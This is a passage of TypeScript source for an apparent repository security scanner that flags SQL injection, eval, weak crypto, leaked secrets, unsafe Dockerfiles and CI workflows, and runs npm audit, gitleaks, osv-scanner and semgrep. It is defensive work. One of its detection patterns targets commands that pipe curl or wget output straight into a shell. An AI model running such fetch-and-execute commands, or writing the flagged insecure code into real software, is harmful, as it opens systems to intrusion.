  { rule: 'sql-injection', re: new RegExp('`\\s*' + SQL + '[^`]*\\$\\{|["\']\\s*' + SQL + '[^"\']*["\']\\s*\\+\\s*\\w|\\bf["\']' + SQL + '[^"\']*\\{', 'i'), files: CODE_FILE },
  { rule: 'code-eval', re: /(?<![\w.])eval\s*\(|\bnew\s+Function\s*\(/, files: CODE_FILE },
  { rule: 'unsafe-deserialize', re: /\bpickle\.loads?\s*\(|\byaml\.load\s*\((?![^)]*Loader\s*=\s*(?:yaml\.)?(?:Safe|Base)Loader)|\byaml\.unsafe_load\s*\(/, files: /\.py$/ },
  { rule: 'weak-random', re: /Math\.random\(\)[^;\n]{0,60}\b(?:token|secret|password|passwd|salt|nonce|otp)\b|\b(?:token|secret|password|passwd|salt|nonce|otp)\w*\s*[:=][^;\n]{0,60}Math\.random\(\)/i, files: JS_FILE },
  { rule: 'weak-hash', re: /(?:\b(?:md5|sha1)\s*\(|createHash\(\s*['"](?:md5|sha1)['"]\s*\)|hashlib\.(?:md5|sha1)\s*\()[^\n]{0,80}\bpass(?:word|wd)?\b|\bpass(?:word|wd)\b[^\n]{0,80}(?:\b(?:md5|sha1)\s*\(|createHash\(\s*['"](?:md5|sha1)['"]\s*\)|hashlib\.(?:md5|sha1)\s*\()/i, files: CODE_FILE },
  { rule: 'html-injection', re: /\.(?:innerHTML|outerHTML)\s*\+?=(?!=)(?!\s*(?:''|""|``)\s*;?\s*$)|\binsertAdjacentHTML\s*\(|dangerouslySetInnerHTML\s*=\s*\{|\bv-html\s*=|document\.write\s*\(/, files: JS_FILE },
  { rule: 'cors-any', re: /Access-Control-Allow-Origin['"]?\s*[:,]\s*['"]\*['"]|\borigin\s*:\s*['"]\*['"]|CORS_ORIGIN_ALLOW_ALL\s*=\s*True|allow_origins\s*=\s*\[\s*['"]\*['"]\s*\]/, files: /./ },
  { rule: 'path-traversal', re: /\b(?:res\.sendFile|res\.download|fs\.(?:readFile|readFileSync|createReadStream|writeFile|writeFileSync|unlink|unlinkSync)|path\.join|send_file|open)\s*\([^)\n]*\b(?:req|request)\.(?:params|query|body|args|form|GET|POST)\b/, files: CODE_FILE },
  { rule: 'open-redirect', re: /\b(?:res\.redirect|redirect|HttpResponseRedirect)\s*\(\s*(?:\d+\s*,\s*)?(?:req|request)\.(?:query|params|body|args|GET|POST)\b/, files: CODE_FILE },
  { rule: 'weak-crypto', re: /\bcrypto\.createCipher\s*\(|createCipheriv\s*\(\s*['"](?:des|des-ede3?|rc4|bf|aes-\d+-ecb)[^'"]*['"]|\bDES\.new\s*\(|\bARC4\.new\s*\(|\bAES\.MODE_ECB\b|Cipher\.getInstance\s*\(\s*"(?:DES|RC4|AES\/ECB|AES")/i, files: CODE_FILE },
  { rule: 'jwt-unverified', re: /\bjwt\.decode\s*\([^)\n]*(?:verify\s*=\s*False|options\s*=\s*\{\s*['"]verify_signature['"]\s*:\s*False)|algorithms?\s*:\s*\[?\s*['"]none['"]/i, files: CODE_FILE },
  { rule: 'debug-on', re:/^\s*DEBUG\s*=\s*True\b/, files: /(^|\/)settings[^/]*\.py$/ },
];

function finding(rule: string, lang: 'en' | 'fr', extra: Partial<Finding> = {}): Finding {
  const r = RULES[rule];
  return { rule, severity: r.severity, ...r[lang], ...(OWASP[rule] ? { owasp: OWASP[rule] } : {}), source: 'prisme', ...extra };
}

/** Checks one file's text. */
export function scanText(file: string, text: string, lang: 'en' | 'fr' = 'en'): Finding[] {
  const out: Finding[] = [];
  const lines = text.split('\n');
  const isTest = TEST_FILE.test(file);
  const isDoc = DOC_FILE.test(file);
  for (const [i, line] of lines.entries()) {
    if (line.length > 2000) continue; // minified or data
    // One finding per secret, even when two patterns know it (an OpenAI key is also an "AI API key").
    const seen: [number, number][] = [];
    for (const { name, re, severity } of SECRET_PATTERNS) {
      for (const m of line.matchAll(re)) {
        const start = m.index ?? 0, end = start + m[0].length;
        if (seen.some(([a, b]) => start < b && a < end)) continue;
        seen.push([start, end]);
        const level: Severity | undefined = isTest ? 'medium' : severity;
        out.push(finding('secret-in-code', lang, { file, line: i + 1, match: `${name}: ${mask(m[0])}`, ...(level ? { severity: level } : {}) }));
      }
    }
    for (const m of line.matchAll(CONNECTION_STRING)) {
      const password = m[2];
      if (PLACEHOLDER.test(password) || /^(?:pass(?:word)?|pwd|secret|root|admin|user|motdepasse|mot_?de_?passe|mdp|passwort|contrase(?:n|ñ)a|senha|\*+|x+)$/i.test(password) || /^\$/.test(password)) continue;
      out.push(finding('connection-string', lang, { file, line: i + 1, match: `${m[1]}:${mask(password)}@…`, ...(isTest ? { severity: 'low' as Severity } : {}) }));
    }
    for (const m of line.matchAll(ASSIGNED_SECRET)) {
      const value = m[2];
      if (PLACEHOLDER.test(value) || PLACEHOLDER.test(line.slice(0, m.index)) || entropy(value) < 3.2) continue;
      if (out.some(f => f.line === i + 1 && f.rule === 'secret-in-code')) continue;
      if (isTest) continue;
      out.push(finding('password-in-code', lang, { file, line: i + 1, match: `${m[1]} = ${mask(value)}` }));
    }
    // Tests and docs hold samples of risky code on purpose: only secrets count there.
    if (isTest || isDoc) continue;
    for (const { rule, re, files } of LINE_RULES) {
      if (!files.test(file) || !re.test(line)) continue;
      out.push(finding(rule, lang, { file, line: i + 1, match: line.trim().slice(0, 120) }));
    }
  }
  return out;
}

// ── checks on the repository ──────────────────────────────

const ENV_FILE = /(^|\/)\.env(\.[\w.-]+)?$/;
const ENV_EXAMPLE = /\.(example|sample|template|dist|defaults?)$/i;
const KEY_FILE = /(^|\/)(id_rsa|id_dsa|id_ecdsa|id_ed25519)$|\.(pem|key|p12|pfx|jks|keystore)$/i;

export function scanRepository(cwd: string, files: string[], lang: 'en' | 'fr' = 'en', contents?: Map<string, string>): Finding[] {
  const out: Finding[] = [];
  const has = (f: string) => files.includes(f);
  const tracked = new Set((git(['ls-files'], cwd) ?? '').split('\n').filter(Boolean));
  const inGit = (f: string) => tracked.size ? tracked.has(f) : true;

  for (const f of files) {
    if (ENV_FILE.test(f) && !ENV_EXAMPLE.test(f) && inGit(f)) out.push(finding('env-committed', lang, { file: f }));
    if (KEY_FILE.test(f) && !TEST_FILE.test(f)) {
      const alreadyFound = contents?.get(f) !== undefined && scanText(f, contents.get(f)!, lang).some(x => x.rule === 'secret-in-code');
      if (!alreadyFound) out.push(finding('key-file-committed', lang, { file: f }));
    }
  }

  // .env in .gitignore, when the project reads environment variables.
  // The project keeps settings in .env files: it has one (even an example) or loads them with dotenv.
  const usesEnv = files.some(f => ENV_FILE.test(f)) || [...(contents?.entries() ?? [])].some(([f, t]) => !TEST_FILE.test(f) && /require\(\s*['"]dotenv|from\s+['"]dotenv|import\s+['"]dotenv|load_dotenv\(|godotenv\.Load/.test(t));
  if (usesEnv && tracked.size) {
    const ignore = readText(cwd, '.gitignore') ?? '';
    if (!/^\s*\/?\.env(\*|\.\*)?\s*$/m.test(ignore) && !/^\s*\*\.env\s*$/m.test(ignore)) out.push(finding('env-not-ignored', lang, { file: '.gitignore' }));
  }

  for (const f of files.filter(f => /(^|\/)Dockerfile[^/]*$/.test(f))) {
    const text = readText(cwd, f) ?? '';
    const users = [...text.matchAll(/^\s*USER\s+(\S+)/gmi)].map(m => m[1]);
    if (!users.length || ['root', '0'].includes(users[users.length - 1])) out.push(finding('docker-root', lang, { file: f }));
    // FROM image (no tag) or image:latest, except "scratch" and earlier build stages.
    const stages = new Set<string>(['scratch']);
    for (const [i, line] of text.split('\n').entries()) {
      const from = line.match(/^\s*FROM\s+(?:--platform=\S+\s+)?(\S+)(?:\s+AS\s+(\S+))?/i);
      if (!from) continue;
      const image = from[1];
      if (!stages.has(image.toLowerCase()) && !image.includes('@sha256:') && !image.includes('$') && (!/:[^/]+$/.test(image) || /:latest$/.test(image)))
        out.push(finding('docker-latest', lang, { file: f, line: i + 1, match: line.trim() }));
      if (from[2]) stages.add(from[2].toLowerCase());
    }
  }

  // Lines that fetch code: Dockerfiles, shell scripts, Makefiles and CI workflows.
  const fetchers = files.filter(f => /(^|\/)(Dockerfile[^/]*|Makefile|[^/]+\.(sh|bash))$|^\.github\/workflows\/.+\.ya?ml$/.test(f));
  for (const f of fetchers) {
    for (const [i, line] of (readText(cwd, f) ?? '').split('\n').entries()) {
      if (/^\s*#/.test(line)) continue;
      if (/\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:ba|z|da)?sh\b/.test(line))
        out.push(finding('remote-script', lang, { file: f, line: i + 1, match: line.trim().slice(0, 120) }));
      else if (/\b(?:curl|wget|ADD)\s[^\n]*\bhttp:\/\/(?!localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\])/.test(line))
        out.push(finding('insecure-download', lang, { file: f, line: i + 1, match: line.trim().slice(0, 120) }));
    }
  }

  const lockfile = ['package-lock.json', 'yarn.lock', 'pnpm-lock.yaml', 'npm-shrinkwrap.json'].some(l => has(l));
  // Values anyone can write: an issue or PR title, a comment, a branch name.
  const UNTRUSTED = /\$\{\{\s*(?:github\.event\.(?:issue|pull_request|comment|review|review_comment|discussion|discussion_comment|head_commit|commits|pages|workflow_run)\b[\w.[\]*]*\.(?:title|body|message|name|label|ref|email|head_branch|default_branch)|github\.head_ref)\s*\}\}/;
  for (const f of files.filter(f => /^\.github\/workflows\/.+\.ya?ml$/.test(f))) {
    const text = readText(cwd, f) ?? '';
    if (/pull_request_target/.test(text) && /github\.event\.pull_request\.head\.(sha|ref)|refs\/pull\//.test(text)) out.push(finding('workflow-pr-target', lang, { file: f }));
    // Rights: none declared, or everything.
    if (/^\s*permissions\s*:\s*write-all\b/m.test(text)) out.push(finding('workflow-permissions', lang, { file: f, severity: 'medium', match: 'permissions: write-all' }));
    else if (!/^\s*permissions\s*:/m.test(text)) out.push(finding('workflow-permissions', lang, { file: f }));
    const unpinned: string[] = [];
    for (const [i, line] of text.split('\n').entries()) {
      // `KEY: ${{ … }}` hands the value over as an env var or an input: safe. Anything else pastes it into a script.
      if (UNTRUSTED.test(line) && !/^\s*-?\s*[\w-]+\s*:\s*['"]?\$\{\{[^}]*\}\}['"]?\s*$/.test(line))
        out.push(finding('workflow-script-injection', lang, { file: f, line: i + 1, match: line.trim().slice(0, 120) }));
      const uses = line.match(/^\s*-?\s*uses:\s*['"]?([\w.-]+)\/([\w./-]+)@([\w./-]+)/);
      if (uses && !['actions', 'github'].includes(uses[1]) && !/^[0-9a-f]{40}$/.test(uses[3])) unpinned.push(`${uses[1]}/${uses[2]}@${uses[3]}`);
      if (lockfile && /^\s*(?:-\s*)?(?:run:\s*)?.*\b(?:npm\s+(?:install|i)\b(?![^\n]*\s-g\b)(?!\s+-g)|yarn(?:\s+install)?\s*$|pnpm\s+install\b(?![^\n]*--frozen-lockfile))/.test(line) && !/npm\s+ci\b/.test(line))
        out.push(finding('ci-install-unlocked', lang, { file: f, line: i + 1, match: line.trim().slice(0, 120) }));
    }
    if (unpinned.length) out.push(finding('unpinned-action', lang, { file: f, match: unpinned.slice(0, 3).join(', ') + (unpinned.length > 3 ? ` (+${unpinned.length - 3})` : '') }));
  }

  // Something to keep dependencies up to date, when there are dependencies.
  const MANIFEST = /(^|\/)(package\.json|requirements[^/]*\.txt|pyproject\.toml|Pipfile|go\.mod|Cargo\.toml|Gemfile|composer\.json|pom\.xml|build\.gradle(\.kts)?)$/;
  const updater = ['.github/dependabot.yml', '.github/dependabot.yaml', 'renovate.json', 'renovate.json5', '.renovaterc', '.renovaterc.json', '.github/renovate.json', '.github/renovate.json5'].some(has);
  if (tracked.size && !updater && files.some(f => MANIFEST.test(f) && !f.includes('node_modules/')))
    out.push(finding('no-dependency-updates', lang));
  // A way to report a flaw privately.
  if (tracked.size && !['SECURITY.md', '.github/SECURITY.md', 'docs/SECURITY.md', 'SECURITY.rst', 'SECURITY.txt'].some(has))
    out.push(finding('no-security-policy', lang));

  for (const pkg of files.filter(f => /(^|\/)package\.json$/.test(f))) {
    const dir = path.posix.dirname(pkg) === '.' ? '' : path.posix.dirname(pkg) + '/';
    try {
      const data = JSON.parse(readText(cwd, pkg) ?? '{}');
      const deps = Object.keys(data.dependencies ?? {}).length + Object.keys(data.devDependencies ?? {}).length;
      const locked = ['package-lock.json', 'yarn.lock', 'pnpm-lock.yaml', 'bun.lockb', 'bun.lock', 'npm-shrinkwrap.json'].some(l => has(dir + l));
      // A workspace's packages share the root lockfile.
      const rootLocked = ['package-lock.json', 'yarn.lock', 'pnpm-lock.yaml', 'bun.lockb', 'bun.lock'].some(l => has(l));
      if (deps && !locked && !rootLocked) out.push(finding('no-lockfile', lang, { file: pkg }));
    } catch { /* not JSON: not our business */ }
  }
  return out;
}

// ── tools ─────────────────────────────────────────────────

function onPath(command: string): boolean {
  if (process.platform === 'win32') return false;
  return spawnSync('sh', ['-c', `command -v ${command}`], { stdio: 'ignore' }).status === 0;
}

const AUDIT_SEVERITY: Record<string, Severity> = { critical: 'critical', high: 'high', moderate: 'medium', low: 'low' };

/** npm audit, from the lockfile; needs the network. */
function runNpmAudit(cwd: string, lang: 'en' | 'fr'): { run: ToolRun; findings: Finding[] } {
  if (!fs.existsSync(path.join(cwd, 'package-lock.json'))) return { run: { name: 'npm audit', status: 'skipped', findings: 0, note: 'no package-lock.json' }, findings: [] };
  if (!onPath('npm')) return { run: { name: 'npm audit', status: 'missing', findings: 0 }, findings: [] };
  // Production dependencies: the ones that reach the people who use the project.
  const result = spawnSync('npm', ['audit', '--json', '--package-lock-only', '--omit=dev'], { cwd, encoding: 'utf-8', timeout: 60_000, maxBuffer: 64 * 1024 * 1024 });
  try {
    const data = JSON.parse(result.stdout);
    if (data.error) throw new Error(data.error.summary ?? 'npm audit failed');
    const findings: Finding[] = Object.entries<any>(data.vulnerabilities ?? {}).map(([name, v]) => {
      const via = (v.via ?? []).find((x: unknown) => typeof x === 'object') as { title?: string; url?: string } | undefined;
      const fixed = typeof v.fixAvailable === 'object' ? `${v.fixAvailable.name}@${v.fixAvailable.version}` : v.fixAvailable ? 'npm audit fix' : null;
      return finding('vulnerable-dependency', lang, {
        severity: AUDIT_SEVERITY[v.severity] ?? 'medium',
        file: 'package-lock.json',
        match: `${name} ${v.range ?? ''}${via?.title ? ` — ${via.title}` : ''}${fixed ? ` (fix: ${fixed})` : ''}${via?.url ? ` ${via.url}` : ''}`.trim(),
        source: 'npm-audit',
      });
    });
    return { run: { name: 'npm audit', status: 'ran', findings: findings.length, note: 'production dependencies' }, findings };
  } catch (e) {
    return { run: { name: 'npm audit', status: 'failed', findings: 0, note: String((e as Error).message ?? e).slice(0, 200) }, findings: [] };
  }
}

function tmpFile(name: string): string {
  return path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'prisme-security-')), name);
}

function runGitleaks(cwd: string, lang: 'en' | 'fr'): { run: ToolRun; findings: Finding[] } {
  if (!onPath('gitleaks')) return { run: { name: 'gitleaks', status: 'missing', findings: 0 }, findings: [] };
  const out = tmpFile('gitleaks.json');
  spawnSync('gitleaks', ['detect', '--source', cwd, '--no-git', '--redact', '--no-banner', '--report-format', 'json', '--report-path', out], { cwd, timeout: 180_000, stdio: 'ignore' });
  try {
    const data = JSON.parse(fs.readFileSync(out, 'utf-8')) as { RuleID?: string; Description?: string; File?: string; StartLine?: number }[];
    const findings = data.map(d => finding('secret-in-code', lang, {
      file: d.File ? path.relative(cwd, path.resolve(cwd, d.File)) : undefined,
      line: d.StartLine, match: d.Description ?? d.RuleID, source: 'gitleaks',
    }));
    return { run: { name: 'gitleaks', status: 'ran', findings: findings.length }, findings };
  } catch (e) {
    return { run: { name: 'gitleaks', status: 'failed', findings: 0, note: String((e as Error).message).slice(0, 200) }, findings: [] };
  } finally {
    fs.rmSync(path.dirname(out), { recursive: true, force: true });
  }
}

const OSV_SEVERITY = (score: number): Severity => score >= 9 ? 'critical' : score >= 7 ? 'high' : score >= 4 ? 'medium' : 'low';

function runOsvScanner(cwd: string, lang: 'en' | 'fr'): { run: ToolRun; findings: Finding[] } {
  if (!onPath('osv-scanner')) return { run: { name: 'osv-scanner', status: 'missing', findings: 0 }, findings: [] };
  const result = spawnSync('osv-scanner', ['--format', 'json', '--recursive', cwd], { cwd, encoding: 'utf-8', timeout: 180_000, maxBuffer: 64 * 1024 * 1024 });
  try {
    const data = JSON.parse(result.stdout) as { results?: { source?: { path?: string }; packages?: { package?: { name?: string; version?: string }; vulnerabilities?: { id?: string; summary?: string }[]; groups?: { max_severity?: string }[] }[] }[] };
    const findings: Finding[] = [];
    for (const r of data.results ?? []) for (const p of r.packages ?? []) {
      const score = Math.max(0, ...(p.groups ?? []).map(g => parseFloat(g.max_severity ?? '') || 0));
      for (const v of p.vulnerabilities ?? []) findings.push(finding('vulnerable-dependency', lang, {
        severity: score ? OSV_SEVERITY(score) : 'medium',
        file: r.source?.path ? path.relative(cwd, r.source.path) : undefined,
        match: `${p.package?.name}@${p.package?.version} — ${v.id}${v.summary ? `: ${v.summary}` : ''}`,
        source: 'osv-scanner',
      }));
    }
    return { run: { name: 'osv-scanner', status: 'ran', findings: findings.length }, findings };
  } catch (e) {
    return { run: { name: 'osv-scanner', status: 'failed', findings: 0, note: String((e as Error).message).slice(0, 200) }, findings: [] };
  }
}

const SEMGREP_SEVERITY: Record<string, Severity> = { ERROR: 'high', WARNING: 'medium', INFO: 'low' };

function runSemgrep(cwd: string, lang: 'en' | 'fr'): { run: ToolRun; findings: Finding[] } {
  if (!onPath('semgrep')) return { run: { name: 'semgrep', status: 'missing', findings: 0 }, findings: [] };
  const result = spawnSync('semgrep', ['scan', '--config', 'p/default', '--json', '--quiet', '--metrics=off'], { cwd, encoding: 'utf-8', timeout: 600_000, maxBuffer: 128 * 1024 * 1024 });
  try {
    const data = JSON.parse(result.stdout) as { results?: { check_id?: string; path?: string; start?: { line?: number }; extra?: { message?: string; severity?: string; metadata?: { owasp?: string | string[] } } }[] };
    const findings = (data.results ?? []).map(r => ({
      ...finding('tool-finding', lang, { severity: SEMGREP_SEVERITY[r.extra?.severity ?? ''] ?? 'medium', file: r.path, line: r.start?.line, source: 'semgrep' as const }),
      rule: `semgrep:${r.check_id}`,
      ...(r.extra?.metadata?.owasp ? { owasp: ([] as string[]).concat(r.extra.metadata.owasp)[0] } : {}),
      why: (r.extra?.message ?? '').slice(0, 600) || RULES['tool-finding'][lang].why,
    }));
    return { run: { name: 'semgrep', status: 'ran', findings: findings.length }, findings };
  } catch (e) {
    return { run: { name: 'semgrep', status: 'failed', findings: 0, note: String((e as Error).message).slice(0, 200) }, findings: [] };
  }
}

// ── ignored findings ──────────────────────────────────────

export const IGNORE_FILE = 'security.yaml';

/** .prisme/security.yaml: `ignore: [{ rule, file?, line?, reason }]`. Entries without a rule or a reason are dropped. */
export function readIgnoreRules(cwd?: string): IgnoreRule[] {
  try {
    const data = YAML.parse(readOmmFile(getOmmDir(cwd), path.join(getOmmDir(cwd), IGNORE_FILE)) ?? '') as { ignore?: unknown } | null;
    if (!Array.isArray(data?.ignore)) return [];
    return data.ignore.filter((x): x is IgnoreRule =>
      !!x && typeof x === 'object' && typeof (x as IgnoreRule).rule === 'string' && typeof (x as IgnoreRule).reason === 'string' && !!(x as IgnoreRule).reason.trim());
  } catch {
    return [];
  }
}

/** The ignore entry covering a finding: same rule, same file (or a folder ending in /), same line when given. */
export function ignoredBy(f: Finding, rules: IgnoreRule[]): IgnoreRule | null {
  return rules.find(r => r.rule === f.rule
    && (r.file === undefined || (r.file.endsWith('/') ? (f.file ?? '').startsWith(r.file) : f.file === r.file))
    && (r.line === undefined || f.line === r.line)) ?? null;
}

// ── report ────────────────────────────────────────────────

export interface SecurityOptions {
  /** Run npm audit and the bonus tools found on the machine (default: true) */
  tools?: boolean;
}

export function securityLanguage(cwd?: string): 'en' | 'fr' {
  return getLanguage(cwd).split('-')[0] === 'fr' ? 'fr' : 'en';
}

export function runSecurity(cwd: string = process.cwd(), options: SecurityOptions = {}): SecurityReport {
  const lang = securityLanguage(cwd);
  const all = projectFiles(cwd);
  const files = all.filter(f => !SKIP_FILES.test(f));
  const contents = new Map<string, string>();
  const findings: Finding[] = [];
  for (const f of files) {
    const text = readText(cwd, f);
    if (text === null) continue;
    contents.set(f, text);
    findings.push(...scanText(f, text, lang));
  }
  findings.push(...scanRepository(cwd, all, lang, contents));

  const tools: ToolRun[] = [];
  if (options.tools !== false) {
    for (const run of [runNpmAudit, runGitleaks, runOsvScanner, runSemgrep]) {
      const result = run(cwd, lang);
      tools.push(result.run);
      // gitleaks repeats what the base checks found on the same line.
      for (const f of result.findings) {
        if (f.source === 'gitleaks' && findings.some(x => x.rule === 'secret-in-code' && x.file === f.file && x.line === f.line)) continue;
        findings.push(f);
      }
    }
  } else {
    for (const name of ['npm audit', 'gitleaks', 'osv-scanner', 'semgrep']) tools.push({ name, status: 'skipped', findings: 0 });
  }

  const ignoreRules = readIgnoreRules(cwd);
  const ignored: SecurityReport['ignored'] = [];
  for (let i = findings.length - 1; i >= 0; i--) {
    const by = ignoredBy(findings[i], ignoreRules);
    if (by) ignored.unshift({ ...findings.splice(i, 1)[0], reason: by.reason });
  }

  const order = (s: Severity) => SEVERITIES.indexOf(s);
  findings.sort((a, b) => order(a.severity) - order(b.severity) || (a.file ?? '').localeCompare(b.file ?? '') || (a.line ?? 0) - (b.line ?? 0));
  const counts = Object.fromEntries(SEVERITIES.map(s => [s, findings.filter(f => f.severity === s).length])) as Record<Severity, number>;
  const { score, grade } = scoreFindings(findings);
  return {
    version: 1,
    date: new Date().toISOString(),
    commit: git(['rev-parse', 'HEAD'], cwd)?.trim() ?? null,
    grade, score, counts, files: contents.size, findings, ignored, tools,
  };
}

export function reportPath(name: string, cwd?: string): string {
  return path.join(getOmmDir(cwd), REPORTS_DIR, name);
}

export function writeSecurityReport(report: SecurityReport, cwd?: string): string {
  const file = reportPath(SECURITY_REPORT, cwd);
  writeOmmFile(getOmmDir(cwd), file, JSON.stringify(report, null, 2) + '\n');
  return file;
}

export function readSecurityReport(cwd?: string): SecurityReport | null {
  try {
    const data = JSON.parse(readOmmFile(getOmmDir(cwd), reportPath(SECURITY_REPORT, cwd)) ?? 'null');
    return data && data.version === 1 ? data as SecurityReport : null;
  } catch {
    return null;
  }
}
